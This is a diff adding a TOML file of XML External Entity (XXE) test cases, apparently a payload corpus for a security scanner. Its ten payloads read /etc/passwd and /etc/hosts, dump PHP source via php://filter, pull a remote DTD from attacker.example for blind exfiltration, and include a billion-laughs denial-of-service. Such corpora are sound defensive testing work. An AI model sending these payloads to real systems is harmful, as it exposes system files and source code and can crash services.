@@ -1,0 +1,62 @@
+schema = 1
+# XML External Entity (XXE) injection.
+
+[[case]]
+id = "external_passwd"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+
+[[case]]
+id = "external_etc_hosts"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"
+
+[[case]]
+id = "external_php_filter"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>"
+
+[[case]]
+id = "parameter_entity_blind"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.example/x.dtd\">%xxe;]><foo>x</foo>"
+
+[[case]]
+id = "billion_laughs"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>"
+
+[[case]]
+id = "xinclude_passwd"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>"
+
+[[case]]
+id = "soap_xxe"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><x>&xxe;</x></soap:Body></soap:Envelope>"
+
+[[case]]
+id = "xxe_in_svg"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+
+[[case]]
+id = "blind_oob_dtd"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.example/x.dtd\"><foo>x</foo>"
+
+[[case]]
+id = "xxe_with_cdata"
+class = "xxe"
+mode = "raw_body"
+payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[&xxe;]]></foo>"
